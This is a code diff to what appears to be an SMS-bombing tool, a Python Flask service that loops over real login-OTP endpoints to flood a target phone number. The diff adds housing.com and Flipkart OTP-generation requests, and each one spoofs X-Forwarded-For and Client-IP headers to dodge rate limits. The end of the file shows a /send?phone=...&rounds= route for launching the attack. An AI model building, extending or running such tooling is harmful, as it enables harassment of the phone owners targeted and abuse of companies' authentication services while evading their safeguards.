@@ -1142,6 +1142,36 @@ def get_apis_list(phone_number, ip_address):
                 "X-Forwarded-For": ip_address,
                 "Client-IP": ip_address
             }
+        },
+        {
+            "endpoint": "https://login.housing.com/api/v2/send-otp",
+            "method": "POST",
+            "payload": {"phone": phone_number},
+            "headers": {
+                "User-Agent": "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
+                "Accept": "application/json, text/plain, */*",
+                "Accept-Language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
+                "Content-Type": "application/json",
+                "Origin": "https://login.housing.com",
+                "Referer": "https://login.housing.com/",
+                "X-Forwarded-For": ip_address,
+                "Client-IP": ip_address
+            }
+        },
+        {
+            "endpoint": "https://www.flipkart.com/api/5/user/otp/generate",
+            "method": "POST",
+            "payload": {"loginId": f"+91{phone_number}"},
+            "headers": {
+                "X-user-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0 FKUA/website/41/website/Desktop",
+                "Content-Type": "application/x-www-form-urlencoded",
+                "User-Agent": "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
+                "Accept": "*/*",
+                "Origin": "https://www.flipkart.com",
+                "Referer": "https://www.flipkart.com/",
+                "X-Forwarded-For": ip_address,
+                "Client-IP": ip_address
+            }
         }
     ]
 
@@ -1303,3 +1333,4 @@ if __name__ == "__main__":
     print(f"  http://localhost:{port}/send?phone=8384884484&rounds=1")
     print(f"\nStarting server on http://0.0.0.0:{port}\n")
     app.run(host='0.0.0.0', port=port, debug=False)
+    
